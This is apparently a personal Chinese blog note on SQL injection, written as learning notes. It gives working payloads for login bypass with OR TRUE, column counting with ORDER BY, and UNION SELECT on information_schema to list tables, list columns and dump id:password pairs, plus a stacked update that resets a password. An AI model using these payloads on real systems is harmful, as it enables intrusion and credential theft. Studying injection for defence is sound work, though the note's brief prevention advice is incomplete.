---
title: SQL注入
date: 2022-06-27 14:31:24
tags:
categories:
---

# SQL注入

[启蒙](https://www.cnblogs.com/ichunqiu/p/9604564.html)

## 攻击

### 绕过密码登录

（也叫条件注入）

![image-20220418151828925](https://picgo-freejim.oss-cn-beijing.aliyuncs.com/image-20220418151828925.png)

![image-20220418150656284](https://picgo-freejim.oss-cn-beijing.aliyuncs.com/image-20220418150656284.png)

![image-20220418150718927](https://picgo-freejim.oss-cn-beijing.aliyuncs.com/image-20220418150718927.png)

只要username正确，那么直接绕过密码了:)

原因是sql语句被恶意篡改成了

```
SELECT * FROM user WHERE id = 4 OR TRUE AND password = ${password};
```





如果它不过滤查询字符串，它将给出如下错误：

第5行的Article.php中的5MySQL语法错误

则该网站易受攻击



简单检查密码

```java
    @NotBlank(message = "密码不能为空")
    @Pattern(regexp = "^(?![0-9]+$)(?![a-zA-Z]+$)[0-9A-Za-z]{8,32}$",message = "密码不符合格式要求")
    private String password;
```





### 查看数据库某表的列数

![image-20220418151803683](https://picgo-freejim.oss-cn-beijing.aliyuncs.com/image-20220418151803683.png)

![image-20220418151653801](https://picgo-freejim.oss-cn-beijing.aliyuncs.com/image-20220418151653801.png)

![image-20220418153235568](https://picgo-freejim.oss-cn-beijing.aliyuncs.com/image-20220418153235568.png)



（原语法：order by + 列名，以某列的值作排序的依据）

（如果是数字的话，则相当于用各列的下标来表示各列）

不断增大order by后的数字

不报错，就说明该列存在

报错了，就说明当前表的列数是它减一:)



Ps：



### 查看数据库中所有得表名

![image-20220418155712707](https://picgo-freejim.oss-cn-beijing.aliyuncs.com/image-20220418155712707.png)

![image-20220418155741695](https://picgo-freejim.oss-cn-beijing.aliyuncs.com/image-20220418155741695.png)

![image-20220418160326964](https://picgo-freejim.oss-cn-beijing.aliyuncs.com/image-20220418160326964.png)

原本要返回的本来是当前班级的学生列表的

每个学生的信息包括：ID和姓名

这sql注入直接利用UNION把数据库里所有的表名当成学生数据返回了



注入部分

```
1 UNION SELECT 1,table_name,3,4 FROM information_schema.tables--
```

字段解释：

1 —— 班级id

UNION —— 把两个select的结果连接起来

（理所当然的要求前后两个select的列数要一致）

（这也是为什么要获取列数的原因）



1,table_name,3,4 —— 是第二个select语句的各列



information_schema.tables —— 是所有数据库都有的一张表，包含了所有表的表名

（新建的表一般在末尾，前面的都是mysql自带的一些表）



### 获取所有列名:)

切入口和上面一致

注入的sql

```sql
1 UNION SELECT 1,column_name,3,4 FROM information_schema.columns--
```

![image-20220418160853376](https://picgo-freejim.oss-cn-beijing.aliyuncs.com/image-20220418160853376.png)

:) :) :)



### 获取密码

首先是查看user表的列名

![image-20220418161435037](https://picgo-freejim.oss-cn-beijing.aliyuncs.com/image-20220418161435037.png)

注入的sql

```sql
1 UNION SELECT 1,column_name,3,4 FROM information_schema.columns WHERE table_name='user'--
```

获取密码

用户名：密码

![image-20220418161713453](https://picgo-freejim.oss-cn-beijing.aliyuncs.com/image-20220418161713453.png)

注入的sql

```sql
1 UNION SELECT 1,concat(id,0x3a,password),3,4 FROM user--
```



### 时间盲注

![image-20220418164445613](https://picgo-freejim.oss-cn-beijing.aliyuncs.com/image-20220418164445613.png)







## 攻击的特殊手段

--可以把后面的语句给注释掉

null不会导致任何类型转换错误

OR TRUE

UNION 可以理所当然得把查询语句嵌进来（得先用ORDER BY把列数试出来）

### 堆叠注入局限

就是输入类似`1;update user set password = '12345' where id =1`这种方式

让执行完查询语句后在执行更新语句，以达到我们的目的

但是很遗憾，这种方式有很大的局限性

主要就是我们常用的ORM框架并不支持同时执行多条sql语句，因此很难实现注入

据了解，这种方式在php语言中可以成功实践。




## 防范

Integer类型反而不容易被注入

```java
public String checkRow(Integer id){
    ...
}
```

